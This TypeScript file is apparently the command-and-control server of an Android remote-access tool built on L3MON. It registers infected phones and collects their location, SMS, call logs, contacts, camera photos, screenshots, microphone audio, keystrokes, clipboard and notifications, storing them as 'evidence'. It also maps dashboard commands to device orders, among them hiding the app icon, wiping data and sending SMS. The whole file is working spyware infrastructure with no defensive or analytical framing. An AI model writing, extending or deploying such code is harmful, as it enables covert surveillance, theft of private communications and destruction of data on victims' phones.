import { Server as HTTPServer } from "http";
import { Server as SocketIOServer, Socket } from "socket.io";
import { getDb } from "./db";
import { eq } from "drizzle-orm";
import { devices, locationHistory, smsLogs, mediaFiles, callLogs, contacts, installedApps } from "../drizzle/schema";
import { eventBus } from "./eventBus";
import { uploadFile, getDownloadUrl } from "./services/storageService";
import crypto from "crypto";

export interface DeviceLocation {
  deviceId: number;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  speed?: number;
  bearing?: number;
}

export interface SMSMessage {
  deviceId: number;
  phoneNumber: string;
  message: string;
  timestamp: number;
  direction: "incoming" | "outgoing";
}

export interface DeviceStatus {
  deviceId: number;
  status: "online" | "offline" | "inactive";
  batteryLevel: number;
  signalStrength: number;
  timestamp: number;
}

export class WebSocketManager {
  private io: SocketIOServer;
  private deviceConnections: Map<number, Set<string>> = new Map();
  private lastLocations: Map<number, DeviceLocation> = new Map();
  private lastSMS: Map<number, SMSMessage[]> = new Map();

  private static instance: WebSocketManager | null = null;
  public static initialize(server: HTTPServer): WebSocketManager {
    if (!WebSocketManager.instance) {
      WebSocketManager.instance = new WebSocketManager(server);
    }
    return WebSocketManager.instance;
  }

  public static getInstance(): WebSocketManager {
    if (!WebSocketManager.instance) {
      throw new Error("WebSocketManager not initialized. Call initialize(server) first.");
    }
    return WebSocketManager.instance;
  }

  constructor(httpServer: HTTPServer) {
    this.io = new SocketIOServer(httpServer, {
      cors: {
        origin: process.env.FRONTEND_URL || "*",
        methods: ["GET", "POST"],
      },
      transports: ["websocket", "polling"],
      allowEIO3: true,
      path: "/socket.io", 
    });

    // Diagnóstico de bajo nivel
    this.io.engine.on("connection_error", (err: any) => {
      console.log(`[WebSocket] !!! ERROR DE CONEXIÓN !!!`);
      console.log(`[WebSocket] Código: ${err.code} | Mensaje: ${err.message}`);
      if (err.req) console.log(`[WebSocket] URL original: ${err.req.url}`);
    });

    eventBus.removeAllListeners("execute-command");
    this.setupEventHandlers();
    this.setupEventBusListeners();
  }

  private setupEventBusListeners(): void {
    eventBus.on("execute-command", (data: any) => {
      console.log(`[WebSocket] EVENTBUS Bridge: Command for ${data.deviceId}:`, data.action);
      this.broadcastToDevice(data.deviceId, "execute-command", {
        action: data.action,
        details: data.details,
        userId: data.userId,
        payload: data.payload || data.details || {}
      });
    });
  }

  private setupEventHandlers(): void {
    // [ADM FIX] Namespace explicit handler for legacy APKs
    this.io.of("/adm-ws").on("connection", async (socket: Socket) => {
      const { model, manf, release, id: androidId } = socket.handshake.query;
      
      console.log(`[WebSocket] [ADM] APK Connected to namespace /adm-ws: SID=${socket.id}`);
      console.log(`[WebSocket] [ADM] Specs - ID: ${androidId}, Model: ${model}`);

      // 1. Device Registration / Identification
      let connectedDeviceId: number | null = null;
      const effectiveId = String(androidId || "").trim();
      const effectiveModel = (model && String(model).trim().length > 0) ? String(model) : "Android Device";

      if (!effectiveId || effectiveId.length < 4) {
        console.log(`[WebSocket] [ADM] ID inválido: ${effectiveId} - Disconnected`);
        socket.disconnect();
        return;
      }

      try {
        const db = await getDb();
        if (db) {
          const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, effectiveId)).limit(1);
          
          if (deviceRecords.length > 0) {
            connectedDeviceId = deviceRecords[0].id;
            console.log(`[WebSocket] [ADM] Re-connection for DB-ID:${connectedDeviceId}`);
            await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
          } else {
            console.log(`[WebSocket] [ADM] First connection for: ${effectiveModel}`);
            const result = await db.insert(devices).values({
              deviceId: effectiveId,
              deviceName: `${manf || 'Android'} ${effectiveModel}`,
              manufacturer: String(manf || 'Unknown'),
              model: effectiveModel,
              androidVersion: String(release || 'Unknown'),
              ownerId: 1,
              status: "online",
              lastSeen: new Date(),
            } as any);
            connectedDeviceId = (result as any)[0]?.insertId;
          }

          if (connectedDeviceId) {
            const dbId = parseInt(String(connectedDeviceId));
            socket.join(`device:${dbId}`);
            socket.join(`device:${effectiveId}`);
            
            (socket as any).deviceId = dbId;
            (socket as any).androidId = effectiveId;
            
            if (!this.deviceConnections.has(dbId)) {
              this.deviceConnections.set(dbId, new Set());
            }
            this.deviceConnections.get(dbId)!.add(socket.id);
            
            console.log(`[WebSocket] [ADM] Device ${dbId} Authenticated & Synced.`);
            this.io.emit("device-status", { deviceId: dbId, status: "online", timestamp: Date.now() });
          }
        }
      } catch (e) {
        console.error("[WebSocket] [ADM] ERROR CRÍTICO:", e);
      }

      this.setupDeviceDataHandlers(socket);

      socket.on("disconnect", () => {
        if (connectedDeviceId) {
          console.log(`[WebSocket] [ADM] Device ${connectedDeviceId} Offline.`);
          if (this.deviceConnections.has(connectedDeviceId)) {
             this.deviceConnections.get(connectedDeviceId)?.delete(socket.id);
          }
          this.io.emit("device-status", { deviceId: connectedDeviceId, status: "offline", timestamp: Date.now() });
        }
      });
    });

    // Root namespace listener for Dashboard/System
    this.io.on("connection", (socket: Socket) => {
      const { model, id } = socket.handshake.query;
      
      // [PLATINUM DIAGNOSTIC] Detectar si un APK llega al Root en vez de /l3mon
      if (model || id) {
          console.warn(`[WebSocket] [ALERTA] Dispositivo detectado en namespace raíz (Root) en vez de /l3mon.`);
          console.warn(`[WebSocket] [INFO] Modelo: ${model} | ID: ${id} | SID: ${socket.id}`);
          console.warn(`[WebSocket] [ACCION] Esto significa que la URL inyectada en el APK no tiene el sufijo /l3mon.`);
      }

      console.log(`[WebSocket] Dashboard/System connection: SID=${socket.id}`);
      this.setupDashboardSocket(socket);
    });
  }

  private setupDeviceDataHandlers(socket: Socket): void {
    const connectedDeviceId = (socket as any).deviceId;

    socket.on("device-location", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
    });

    socket.on("0xLO", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
    });

    socket.on("device-sms", async (data: SMSMessage) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleSMSMessage({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("sms-received", { ...data, deviceId: id });
        }
    });

    socket.on("0xSM", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          if (typeof data === 'boolean' || (data && data.success !== undefined)) return; 
          const smsList = data.list || data.sms || data.messages || [];
          eventBus.emit(`sms-response-${id}`, { deviceId: id, messages: smsList });
          this.io.to(`device:${id}`).emit("sms-update", { messages: smsList, deviceId: id });
        }
    });

    socket.on("0xCL", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const callsArray = data.list || data.calls || (Array.isArray(data) ? data : []);
          eventBus.emit(`calls-response-${id}`, { deviceId: id, calls: callsArray });
          this.io.to(`device:${id}`).emit("calls-update", { calls: callsArray, deviceId: id });
        }
    });

    socket.on("0xCO", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const contactsArray = data.list || data.contacts || (Array.isArray(data) ? data : []);
          eventBus.emit(`contacts-response-${id}`, { deviceId: id, contacts: contactsArray });
          this.io.to(`device:${id}`).emit("contacts-update", { contacts: contactsArray, deviceId: id });
        }
    });

    socket.on("0xCA", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && (data.imageBase64 || data.image || data.buffer)) {
           const imgData = data.imageBase64 || data.image || data.buffer;
           await this.handleCameraImage(id, imgData);
        }
    });

    // [ADM] Screenshot Response
    socket.on("0xSC", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && (data.imageBase64 || data.image || data.buffer || data.screenshot)) {
           const imgData = data.imageBase64 || data.image || data.buffer || data.screenshot;
           await this.handleScreenshot(id, imgData);
        }
    });

    socket.on("0xMI", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id && data.buffer) {
           await this.handleBinaryData(socket, "audio", { buffer: data.buffer, name: data.name || `mic_${Date.now()}.mp3` });
        }
    });
    
    // Catch-all for generic device status
    socket.on("device-status", (data: DeviceStatus) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          this.io.emit("device-status", { deviceId: id, status: data.status, timestamp: Date.now() });
        }
    });

    // [ADM] File Explorer Response
    socket.on("0xFI", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          eventBus.emit(`files-response-${id}`, { deviceId: id, path: data.path || "/", contents: data.list || [] });
        }
    });

    // [ADM] App Manager Response
    socket.on("0xPM", (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          eventBus.emit(`apps-response-${id}`, { deviceId: id, apps: data.list || [] });
        }
    });

    // [ADM] Permissions/Status Updates
    socket.on("device-permissions", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handlePermissionUpdate({ deviceId: id, permissions: data.permissions });
    });

    socket.on("device-keylog", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handleKeylogUpdate({ ...data, deviceId: id });
    });

    socket.on("device-clipboard", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handleClipboardUpdate({ ...data, deviceId: id });
    });

    socket.on("device-notification", async (data: any) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) await this.handleNotificationUpdate({ ...data, deviceId: id });
    });
  }

  private async handleCameraImage(id: number, base64Data: string): Promise<void> {
    try {
      const timestamp = Date.now();
      const fileName = `camera_${id}_${timestamp}.jpg`;
      
      const buffer = typeof base64Data === 'string'
        ? Buffer.from(base64Data.replace(/^data:image\/\w+;base64,/, ''), 'base64')
        : Buffer.from(base64Data);

      const result = await uploadFile(buffer, fileName, "evidence", "image/jpeg");
      
      if (!result.success) throw new Error(result.error);

      const db = await getDb();
      if (db) {
        await db.insert(mediaFiles).values({
          deviceId: id,
          fileName,
          fileType: "photo",
          fileSize: buffer.length,
          fileUrl: result.url,
          timestamp: new Date(),
        });
      }
      this.io.emit("camera-new", { deviceId: id, fileName, url: result.url, timestamp });
    } catch (e) {
      console.error("[WebSocket] Camera save failed:", e);
    }
  }

  // [ADM] Handle Screenshot from device
  private async handleScreenshot(id: number, base64Data: string): Promise<void> {
    try {
      const timestamp = Date.now();
      const fileName = `screenshot_${id}_${timestamp}.png`;

      // Handle both base64 string and buffer
      const buffer = typeof base64Data === 'string'
        ? Buffer.from(base64Data.replace(/^data:image\/\w+;base64,/, ''), 'base64')
        : Buffer.from(base64Data);

      const result = await uploadFile(buffer, fileName, "evidence", "image/png");
      if (!result.success) throw new Error(result.error);

      const db = await getDb();
      if (db) {
        await db.insert(mediaFiles).values({
          deviceId: id,
          fileName,
          fileType: "screenshot",
          fileSize: buffer.length,
          fileUrl: result.url,
          timestamp: new Date(),
        });
      }
      this.io.emit("screenshot-new", { deviceId: id, fileName, url: result.url, timestamp });
      console.log(`[WebSocket] Screenshot saved to cloud: ${fileName}`);
    } catch (e) {
      console.error("[WebSocket] Screenshot save failed:", e);
    }
  }

  private setupDashboardSocket(socket: Socket): void {
    socket.on("join-device", (targetId: number) => {
      socket.join(`device:${targetId}`);
      console.log(`[WebSocket] Dashboard SID=${socket.id} monitoring device ${targetId}`);
    });

    socket.on("leave-device", (targetId: number) => {
      socket.leave(`device:${targetId}`);
    });
  }

  public broadcastToDevice(deviceId: any, event: string, data: any): void {
    const rawAction = data.action || event;
    const action = String(rawAction).trim().toLowerCase();
    
    const mapping: Record<string, string> = {
      "vibrate": "0xVB", "lock-screen": "0xLK", "lock_device": "0xLK",
      "screenshot": "0xSC", "reboot": "0xRB", "wipe-data": "0xWD",
      "hide-icon": "0xHO", "show-icon": "0xSO", "request-files": "0xFI",
      "get-files": "0xFI", "list_files": "0xFI", "download-file": "0xFI",
      "get-sms": "0xSM", "send-sms": "0xSM", "get-call-log": "0xCL",
      "get-calls": "0xCL", "get-contacts": "0xCO", "get-apps": "0xPM",
      "get-info": "0xIN", "get-location": "0xLO", "get_location": "0xLO",
      "set-gps-freq": "0xGF", "get-wifi": "0xWI", "capture-camera": "0xCA",
      "take_photo": "0xCA", "get-camera": "0xCA", "record-mic": "0xMI",
      "start_audio_recording": "0xMI", "get-permissions": "0xGP",
      // Nuevos comandos - Screen Recording & Streaming
      "start_screen_recording": "0xSR", "stop_screen_recording": "0xST",
      "start_screen_stream": "0xSP", "screen-recording": "0xSR",
      "screen-stream": "0xSP",
    };

    const mappedAction = mapping[action] || action;
    const details = data.payload || data.details || {};
    
    // [ADM] Precise Protocol Alignment for L3MON Smali
    let payload: any = { 
        type: mappedAction, 
        action: action, 
        deviceId: deviceId, 
        timestamp: Date.now() 
    };

    if (action.includes("files")) {
        payload.action = action.includes("download") ? "dl" : "ls";
        payload.path = details.path || "/";
    } else if (action === "get-sms") {
        payload.action = "ls";
    } else if (action === "send-sms" || action === "send_sms") {
        payload.action = "sendSMS";
        payload.to = details.to || details.phoneNumber || details.number;
        payload.sms = details.sms || details.message || details.body;
    } else if (mappedAction === "0xCA") {
        // APK expects an INTEGER for "camera"
        payload.camera = details.camera === "front" ? 1 : 0;
    } else if (mappedAction === "0xMI") {
        // APK expects an INTEGER for "sec"
        payload.sec = parseInt(String(details.duration || details.sec || 10));
    } else if (mappedAction === "0xGF") {
        // APK expects a LONG for "minTime"
        payload.minTime = parseInt(String(details.minTime || 10000));
    } else if (action === "screenshot") {
        payload.action = "screenshot";
    }

    Object.assign(payload, details);

    if (this.io) {
      const roomName = `device:${deviceId}`;
      console.log(`[WebSocket] [ADM-TX] Broadcaster: Room=${roomName} | Type=${mappedAction} | Action=${payload.action || 'default'}`);
      
      // Emit to both possible room naming conventions to ensure delivery
      this.io.of("/adm-ws").to(roomName).emit("order", payload);
      this.io.of("/adm-ws").to(String(deviceId)).emit("order", payload);
      
      // Diagnostic: Check if any sockets are actually in the room
      const namespace = this.io.of("/adm-ws");
      const socketsInRoom = namespace.adapter.rooms.get(roomName);
      if (!socketsInRoom || socketsInRoom.size === 0) {
          console.warn(`[WebSocket] [ADM-TX] WARNING: No active sockets found in room ${roomName}. Command might be lost.`);
      } else {
          console.log(`[WebSocket] [ADM-TX] SUCCESS: Command emitted to ${socketsInRoom.size} socket(s) in room ${roomName}.`);
      }

      // Fallback for numeric IDs tracked in memory
      const sids = this.deviceConnections.get(parseInt(String(deviceId)));
      if (sids) {
        sids.forEach(sid => {
            this.io.of("/adm-ws").to(sid).emit("order", payload);
        });
      }
    }
  }

  private async handleLocationUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const lat = data.latitude ?? data.lat;
      const lon = data.longitude ?? data.lon;
      if (lat === undefined || lon === undefined) return;

      const location = {
        deviceId: data.deviceId,
        latitude: parseFloat(String(lat)),
        longitude: parseFloat(String(lon)),
        accuracy: parseFloat(String(data.accuracy || 0)),
        timestamp: new Date()
      };

      await db.insert(locationHistory).values({
        deviceId: location.deviceId,
        latitude: location.latitude.toString(),
        longitude: location.longitude.toString(),
        accuracy: location.accuracy.toString(),
        timestamp: location.timestamp,
      });

      this.lastLocations.set(location.deviceId, location as any);
      await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, location.deviceId));
    } catch (e) {
      console.error("[WebSocket] Location save error:", e);
    }
  }

  private async handleSMSMessage(sms: SMSMessage): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      await db.insert(smsLogs).values({
        deviceId: sms.deviceId,
        phoneNumber: sms.phoneNumber,
        messageBody: sms.message,
        direction: sms.direction,
        timestamp: new Date(sms.timestamp),
      });
    } catch (e) {
      console.error("[WebSocket] SMS save error:", e);
    }
  }

  private async handleBinaryData(socket: Socket, type: string, data: any): Promise<void> {
    try {
      const fileName = `${type}_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.mp3`;
      const result = await uploadFile(data.buffer, fileName, "evidence", "audio/mpeg");
      
      if (!result.success) throw new Error(result.error);

      const db = await getDb();
      const deviceId = (socket as any).deviceId;
      if (db && deviceId) {
        await db.insert(mediaFiles).values({
          deviceId,
          fileType: "audio",
          fileName,
          fileUrl: result.url,
          fileSize: data.buffer.length,
          timestamp: new Date()
        });
      }
      this.io.emit("evidence-new", { type, name: fileName, timestamp: Date.now(), url: result.url });
    } catch (e) {
      console.error("[WebSocket] Binary save error:", e);
    }
  }

  private async handlePermissionUpdate(data: { deviceId: number, permissions: any }): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      await db.update(devices).set({ metadata: { androidPermissions: data.permissions, lastSync: new Date().toISOString() } } as any).where(eq(devices.id, data.deviceId));
    } catch (e) { console.error("[WebSocket] Perms update error:", e); }
  }

  private async handleKeylogUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const { activityLogs } = await import("../drizzle/schema");
      await db.insert(activityLogs).values({
        deviceId: data.deviceId,
        activityType: "keylog",
        description: `[${data.app || 'System'}] ${data.text}`,
        metadata: { app: data.app, text: data.text },
        timestamp: new Date()
      });
    } catch (e) { console.error("[WebSocket] Keylog error:", e); }
  }

  private async handleClipboardUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const { activityLogs } = await import("../drizzle/schema");
      await db.insert(activityLogs).values({
        deviceId: data.deviceId,
        activityType: "clipboard",
        description: `Clipboard: ${String(data.content).substring(0, 50)}...`,
        metadata: { content: data.content },
        timestamp: new Date()
      });
    } catch (e) { console.error("[WebSocket] Clipboard error:", e); }
  }

  private async handleNotificationUpdate(data: any): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const { activityLogs } = await import("../drizzle/schema");
      await db.insert(activityLogs).values({
        deviceId: data.deviceId,
        activityType: "notification",
        description: `Notification from ${data.appName}: ${data.title}`,
        metadata: data,
        timestamp: new Date()
      });
    } catch (e) { console.error("[WebSocket] Notification error:", e); }
  }
}

export function initializeWebSocket(server: HTTPServer): WebSocketManager {
  return WebSocketManager.initialize(server);
}

export function getWebSocketManager(): WebSocketManager {
  return WebSocketManager.getInstance();
}
